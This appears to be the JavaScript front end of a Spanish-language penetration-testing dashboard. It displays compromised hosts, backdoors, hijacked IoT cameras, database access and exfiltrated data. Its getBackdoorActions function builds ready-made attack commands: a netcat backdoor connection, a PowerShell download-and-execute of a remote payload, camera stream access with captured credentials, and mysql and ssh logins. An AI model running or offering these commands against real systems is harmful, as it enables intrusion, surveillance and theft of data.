// Global variables
let currentScan = null;
let allScans = [];

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    loadScans();
    initializeModals();
});

// Load available scans
async function loadScans() {
    try {
        const response = await fetch('/api/scans');
        allScans = await response.json();
        displayScans(allScans);
    } catch (error) {
        console.error('Error loading scans:', error);
        document.getElementById('scanList').innerHTML = 
            '<div class="loading"><i class="fas fa-exclamation-triangle"></i> Error cargando escaneos</div>';
    }
}

// Display scans in the selection list
function displayScans(scans) {
    const scanList = document.getElementById('scanList');
    
    if (scans.length === 0) {
        scanList.innerHTML = '<div class="loading"><i class="fas fa-folder-open"></i> No se encontraron escaneos</div>';
        return;
    }
    
    scanList.innerHTML = scans.map(scan => `
        <div class="scan-item" onclick="selectScan('${scan.scan_id}')">
            <div class="scan-item-header">
                <h3 class="scan-name">${scan.mote}</h3>
                <div class="scan-badges">
                    ${scan.is_cold_pentest ? '<span class="badge cold">🧊 Frío</span>' : '<span class="badge normal">🔥 Normal</span>'}
                    <span class="badge ${getStatusClass(scan.status)}">${getStatusText(scan.status)}</span>
                </div>
            </div>
            <div class="scan-details">
                <p><strong>ID:</strong> ${scan.scan_id}</p>
                <p><strong>Creado:</strong> ${formatDate(scan.created_at)}</p>
                <p><strong>Estado:</strong> ${scan.status}</p>
                ${scan.description ? `<p><strong>Descripción:</strong> ${scan.description}</p>` : ''}
            </div>
        </div>
    `).join('');
}

// Select a scan and load its details
async function selectScan(scanId) {
    // Update UI
    document.querySelectorAll('.scan-item').forEach(item => item.classList.remove('active'));
    event.currentTarget.classList.add('active');
    
    try {
        const response = await fetch(`/api/scan/${scanId}`);
        currentScan = await response.json();
        displayScanDetails(currentScan);
        document.getElementById('mainContent').style.display = 'block';
    } catch (error) {
        console.error('Error loading scan details:', error);
        alert('Error cargando detalles del escaneo');
    }
}

// Display scan details
function displayScanDetails(scan) {
    // Update scan info
    document.getElementById('scanTitle').innerHTML = 
        `<i class="fas fa-chart-line"></i> ${scan.mote} ${scan.is_cold_pentest ? '🧊 (Pentest Frío)' : '🔥 (Pentest Normal)'}`;
    
    // Update badges
    const badges = document.getElementById('scanBadges');
    badges.innerHTML = `
        ${scan.is_cold_pentest ? '<span class="badge cold">🧊 Pentest Frío</span>' : '<span class="badge normal">🔥 Pentest Normal</span>'}
        <span class="badge ${getStatusClass(scan.status)}">${getStatusText(scan.status)}</span>
    `;
    
    // Update scan details
    document.getElementById('scanDetails').innerHTML = `
        <div class="scan-details-grid">
            <div class="detail-item">
                <div class="detail-label">ID del Escaneo</div>
                <div class="detail-value">${scan.scan_id}</div>
            </div>
            <div class="detail-item">
                <div class="detail-label">Estado</div>
                <div class="detail-value">${scan.status}</div>
            </div>
            <div class="detail-item">
                <div class="detail-label">Creado</div>
                <div class="detail-value">${formatDate(scan.created_at)}</div>
            </div>
            <div class="detail-item">
                <div class="detail-label">Completado</div>
                <div class="detail-value">${scan.completed_at ? formatDate(scan.completed_at) : 'No completado'}</div>
            </div>
            ${scan.description ? `
            <div class="detail-item">
                <div class="detail-label">Descripción</div>
                <div class="detail-value">${scan.description}</div>
            </div>
            ` : ''}
        </div>
    `;
    
    // Display statistics
    displayStatistics(scan);
    
    // Display phases
    displayPhases(scan);
    
    // Display persistence and backdoors
    displayPersistence(scan);
    
    // Display compromised systems
    displayCompromisedSystems(scan);
    
    // Display IoT devices
    displayIoTDevices(scan);
    
    // Display database connections
    displayDatabaseConnections(scan);
    
    // Display exfiltrated data
    displayExfiltratedData(scan);
    
    // Display network map
    displayNetworkMap(scan);
}

// Display statistics
function displayStatistics(scan) {
    const stats = calculateStatistics(scan);
    const statsGrid = document.getElementById('statsGrid');
    
    statsGrid.innerHTML = `
        <div class="stat-card">
            <div class="stat-number">${stats.totalPhases}</div>
            <div class="stat-label">Fases Completadas</div>
        </div>
        <div class="stat-card">
            <div class="stat-number">${stats.compromisedSystems}</div>
            <div class="stat-label">Sistemas Comprometidos</div>
        </div>
        <div class="stat-card">
            <div class="stat-number">${stats.backdoors}</div>
            <div class="stat-label">Backdoors Establecidos</div>
        </div>
        <div class="stat-card">
            <div class="stat-number">${stats.iotDevices}</div>
            <div class="stat-label">Dispositivos IoT</div>
        </div>
        <div class="stat-card">
            <div class="stat-number">${stats.databases}</div>
            <div class="stat-label">Bases de Datos</div>
        </div>
        <div class="stat-card">
            <div class="stat-number">${formatBytes(stats.exfiltratedData)}</div>
            <div class="stat-label">Datos Exfiltrados</div>
        </div>
    `;
}

// Display phases
function displayPhases(scan) {
    const phasesGrid = document.getElementById('phasesGrid');
    const phases = getPhasesFromScan(scan);
    
    phasesGrid.innerHTML = phases.map(phase => `
        <div class="phase-card">
            <div class="phase-header">
                <div class="phase-name">${phase.name}</div>
                <div class="phase-status ${phase.status}">${phase.statusText}</div>
            </div>
            <div class="phase-details">
                ${phase.details}
            </div>
        </div>
    `).join('');
}

// Display persistence and backdoors
function displayPersistence(scan) {
    const persistenceContent = document.getElementById('persistenceContent');
    const persistenceSection = document.getElementById('persistenceSection');
    
    const backdoors = getBackdoorsFromScan(scan);
    
    if (backdoors.length === 0) {
        persistenceSection.style.display = 'none';
        return;
    }
    
    persistenceSection.style.display = 'block';
    
    persistenceContent.innerHTML = backdoors.map(backdoor => `
        <div class="backdoor-item">
            <div class="backdoor-header">
                <div class="backdoor-type">${getBackdoorTypeIcon(backdoor.type)} ${backdoor.type}</div>
                <div class="backdoor-status">${backdoor.status}</div>
            </div>
            <div class="backdoor-details">
                <div class="detail-item">
                    <div class="detail-label">IP/Host</div>
                    <div class="detail-value">${backdoor.ip || backdoor.host}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Puerto</div>
                    <div class="detail-value">${backdoor.port || 'N/A'}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Usuario</div>
                    <div class="detail-value">${backdoor.username || 'N/A'}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Contraseña</div>
                    <div class="detail-value">${backdoor.password ? '••••••••' : 'N/A'}</div>
                </div>
            </div>
            <div class="backdoor-actions">
                <div class="actions-title">💡 Acciones Disponibles:</div>
                ${getBackdoorActions(backdoor).map(action => `
                    <div class="action-item">
                        <div class="action-command">${action.command}</div>
                        <div class="action-description">${action.description}</div>
                    </div>
                `).join('')}
            </div>
        </div>
    `).join('');
}

// Display compromised systems
function displayCompromisedSystems(scan) {
    const systemsGrid = document.getElementById('systemsGrid');
    const compromisedSection = document.getElementById('compromisedSection');
    
    const systems = getCompromisedSystemsFromScan(scan);
    
    if (systems.length === 0) {
        compromisedSection.style.display = 'none';
        return;
    }
    
    compromisedSection.style.display = 'block';
    
    systemsGrid.innerHTML = systems.map(system => `
        <div class="system-card">
            <div class="system-header">
                <div class="system-ip">${system.host}</div>
                <div class="system-os">${system.os || 'Unknown'}</div>
            </div>
            <div class="system-details">
                <div class="detail-item">
                    <div class="detail-label">Método de Acceso</div>
                    <div class="detail-value">${system.access_method || 'N/A'}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Usuario</div>
                    <div class="detail-value">${system.username || 'N/A'}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Contraseña</div>
                    <div class="detail-value">${system.password ? '••••••••' : 'N/A'}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Timestamp</div>
                    <div class="detail-value">${formatDate(system.timestamp)}</div>
                </div>
            </div>
        </div>
    `).join('');
}

// Display IoT devices
function displayIoTDevices(scan) {
    const iotGrid = document.getElementById('iotGrid');
    const iotSection = document.getElementById('iotSection');
    
    const devices = getIoTDevicesFromScan(scan);
    
    if (devices.length === 0) {
        iotSection.style.display = 'none';
        return;
    }
    
    iotSection.style.display = 'block';
    
    iotGrid.innerHTML = devices.map(device => `
        <div class="iot-card">
            <div class="iot-header">
                <div class="iot-type">${getIoTTypeIcon(device.device_type)} ${device.device_type}</div>
                <div class="iot-vendor">${device.vendor || 'Unknown'}</div>
            </div>
            <div class="system-details">
                <div class="detail-item">
                    <div class="detail-label">IP</div>
                    <div class="detail-value">${device.ip}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Puerto</div>
                    <div class="detail-value">${device.port || 'N/A'}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Usuario</div>
                    <div class="detail-value">${device.username || 'N/A'}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Contraseña</div>
                    <div class="detail-value">${device.password ? '••••••••' : 'N/A'}</div>
                </div>
            </div>
        </div>
    `).join('');
}

// Display database connections
function displayDatabaseConnections(scan) {
    const databaseGrid = document.getElementById('databaseGrid');
    const databaseSection = document.getElementById('databaseSection');
    
    const databases = getDatabasesFromScan(scan);
    
    if (databases.length === 0) {
        databaseSection.style.display = 'none';
        return;
    }
    
    databaseSection.style.display = 'block';
    
    databaseGrid.innerHTML = databases.map(db => `
        <div class="database-card">
            <div class="database-header">
                <div class="database-type">${getDatabaseTypeIcon(db.database_type)} ${db.database_type}</div>
                <div class="database-host">${db.host}:${db.port}</div>
            </div>
            <div class="system-details">
                <div class="detail-item">
                    <div class="detail-label">Host</div>
                    <div class="detail-value">${db.host}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Puerto</div>
                    <div class="detail-value">${db.port}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Usuario</div>
                    <div class="detail-value">${db.credentials?.username || 'N/A'}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Contraseña</div>
                    <div class="detail-value">${db.credentials?.password ? '••••••••' : 'N/A'}</div>
                </div>
            </div>
        </div>
    `).join('');
}

// Display exfiltrated data
function displayExfiltratedData(scan) {
    const exfiltrationContent = document.getElementById('exfiltrationContent');
    const exfiltrationSection = document.getElementById('exfiltrationSection');
    
    const exfiltratedData = getExfiltratedDataFromScan(scan);
    
    if (exfiltratedData.length === 0) {
        exfiltrationSection.style.display = 'none';
        return;
    }
    
    exfiltrationSection.style.display = 'block';
    
    exfiltrationContent.innerHTML = exfiltratedData.map(data => `
        <div class="exfiltration-item">
            <div class="exfiltration-header">
                <div class="exfiltration-host">${data.host}</div>
                <div class="exfiltration-size">${formatBytes(data.total_size)}</div>
            </div>
            <div class="system-details">
                <div class="detail-item">
                    <div class="detail-label">Archivos Exfiltrados</div>
                    <div class="detail-value">${data.files_count}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Tamaño Total</div>
                    <div class="detail-value">${formatBytes(data.total_size)}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Timestamp</div>
                    <div class="detail-value">${formatDate(data.timestamp)}</div>
                </div>
            </div>
        </div>
    `).join('');
}

// Display network map
function displayNetworkMap(scan) {
    const networkContent = document.getElementById('networkContent');
    const networkSection = document.getElementById('networkSection');
    
    const networkData = getNetworkDataFromScan(scan);
    
    if (!networkData || networkData.length === 0) {
        networkSection.style.display = 'none';
        return;
    }
    
    networkSection.style.display = 'block';
    
    networkContent.innerHTML = networkData.map(segment => `
        <div class="network-segment">
            <div class="segment-header">${segment.network}</div>
            <div class="hosts-list">
                ${segment.hosts.map(host => `
                    <div class="host-item">
                        <div class="host-ip">${host.ip}</div>
                        <div class="host-type">${host.device_type || 'Unknown'}</div>
                    </div>
                `).join('')}
            </div>
        </div>
    `).join('');
}

// Helper functions
function getStatusClass(status) {
    switch (status) {
        case 'completed': return 'completed';
        case 'completed_cold': return 'completed';
        case 'active': return 'active';
        case 'error': return 'error';
        case 'error_cold': return 'error';
        default: return 'active';
    }
}

function getStatusText(status) {
    switch (status) {
        case 'completed': return 'Completado';
        case 'completed_cold': return 'Completado (Frío)';
        case 'active': return 'Activo';
        case 'error': return 'Error';
        case 'error_cold': return 'Error (Frío)';
        default: return 'Desconocido';
    }
}

function formatDate(dateString) {
    if (!dateString) return 'N/A';
    return new Date(dateString).toLocaleString('es-ES');
}

function formatBytes(bytes) {
    if (!bytes) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function getBackdoorTypeIcon(type) {
    const icons = {
        'netcat': '🔌',
        'powershell': '💻',
        'python': '🐍',
        'camera_access': '📹',
        'database_connection': '🗄️',
        'system_compromise': '🖥️'
    };
    return icons[type] || '🔐';
}

function getIoTTypeIcon(type) {
    const icons = {
        'camera': '📹',
        'router': '📡',
        'printer': '🖨️',
        'iot_device': '📱'
    };
    return icons[type] || '📱';
}

function getDatabaseTypeIcon(type) {
    const icons = {
        'mysql': '🐬',
        'postgresql': '🐘',
        'mssql': '🗄️',
        'oracle': '🔶',
        'mongodb': '🍃',
        'redis': '🔴'
    };
    return icons[type] || '🗄️';
}

function getBackdoorActions(backdoor) {
    const actions = [];
    
    switch (backdoor.type) {
        case 'netcat':
            actions.push({
                command: `nc ${backdoor.ip} ${backdoor.port}`,
                description: 'Conectar al backdoor netcat'
            });
            break;
        case 'powershell':
            actions.push({
                command: `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://${backdoor.ip}:${backdoor.port}/payload.ps1')"`,
                description: 'Ejecutar payload PowerShell'
            });
            break;
        case 'camera_access':
            actions.push({
                command: `ffplay rtsp://${backdoor.username}:${backdoor.password}@${backdoor.ip}:${backdoor.port}/stream`,
                description: 'Ver stream de la cámara'
            });
            break;
        case 'database_connection':
            actions.push({
                command: `mysql -h ${backdoor.ip} -P ${backdoor.port} -u ${backdoor.username} -p${backdoor.password}`,
                description: 'Conectar a la base de datos'
            });
            break;
        case 'system_compromise':
            actions.push({
                command: `ssh ${backdoor.username}@${backdoor.ip}`,
                description: 'Conectar por SSH al sistema'
            });
            break;
    }
    
    return actions;
}

// Data extraction functions
function calculateStatistics(scan) {
    return {
        totalPhases: Object.keys(scan.results || {}).length,
        compromisedSystems: getCompromisedSystemsFromScan(scan).length,
        backdoors: getBackdoorsFromScan(scan).length,
        iotDevices: getIoTDevicesFromScan(scan).length,
        databases: getDatabasesFromScan(scan).length,
        exfiltratedData: getExfiltratedDataFromScan(scan).reduce((total, data) => total + (data.total_size || 0), 0)
    };
}

function getPhasesFromScan(scan) {
    const phases = [];
    const results = scan.results || {};
    
    const phaseNames = {
        'reconnaissance': 'Reconocimiento',
        'advanced_reconnaissance': 'Reconocimiento Avanzado',
        'credentials': 'Recolección de Credenciales',
        'lateral_movement': 'Movimiento Lateral',
        'persistence': 'Persistencia',
        'privilege_escalation': 'Escalada de Privilegios',
        'exfiltration': 'Exfiltración',
        'iot_exploitation': 'Explotación IoT',
        'sql_exfiltration': 'Exfiltración SQL',
        'backdoor_management': 'Gestión de Backdoors'
    };
    
    Object.keys(phaseNames).forEach(phaseKey => {
        if (results[phaseKey]) {
            phases.push({
                name: phaseNames[phaseKey],
                status: 'success',
                statusText: 'Completado',
                details: `Fase completada exitosamente`
            });
        }
    });
    
    return phases;
}

function getBackdoorsFromScan(scan) {
    const backdoors = [];
    const results = scan.results || {};
    
    // From persistence
    if (results.persistence?.backdoors) {
        backdoors.push(...results.persistence.backdoors.map(bd => ({
            ...bd,
            status: 'Activo'
        })));
    }
    
    // From IoT
    if (results.iot_exploitation?.remote_access_established) {
        backdoors.push(...results.iot_exploitation.remote_access_established.map(access => ({
            type: 'camera_access',
            ip: access.ip,
            port: access.port,
            username: access.username,
            password: access.password,
            status: 'Activo'
        })));
    }
    
    // From SQL
    if (results.sql_exfiltration?.remote_connections) {
        backdoors.push(...results.sql_exfiltration.remote_connections.map(conn => ({
            type: 'database_connection',
            ip: conn.host,
            port: conn.port,
            username: conn.credentials?.username,
            password: conn.credentials?.password,
            status: 'Activo'
        })));
    }
    
    // From lateral movement
    if (results.lateral_movement?.compromised_systems) {
        backdoors.push(...results.lateral_movement.compromised_systems.map(system => ({
            type: 'system_compromise',
            ip: system.host,
            port: system.port,
            username: system.username,
            password: system.password,
            status: 'Activo'
        })));
    }
    
    return backdoors;
}

function getCompromisedSystemsFromScan(scan) {
    const results = scan.results || {};
    return results.lateral_movement?.compromised_systems || [];
}

function getIoTDevicesFromScan(scan) {
    const results = scan.results || {};
    return results.iot_exploitation?.remote_access_established || [];
}

function getDatabasesFromScan(scan) {
    const results = scan.results || {};
    return results.sql_exfiltration?.remote_connections || [];
}

function getExfiltratedDataFromScan(scan) {
    const results = scan.results || {};
    return results.exfiltration?.exfiltrated_data || [];
}

function getNetworkDataFromScan(scan) {
    const results = scan.results || {};
    return results.advanced_reconnaissance?.topology?.network_segments || [];
}

// Modal functions
function initializeModals() {
    const modal = document.getElementById('credentialModal');
    const closeBtn = document.getElementsByClassName('close')[0];
    
    closeBtn.onclick = function() {
        modal.style.display = 'none';
    }
    
    window.onclick = function(event) {
        if (event.target == modal) {
            modal.style.display = 'none';
        }
    }
}

function showCredentialModal(title, content) {
    document.getElementById('modalTitle').textContent = title;
    document.getElementById('modalContent').innerHTML = content;
    document.getElementById('credentialModal').style.display = 'block';
}
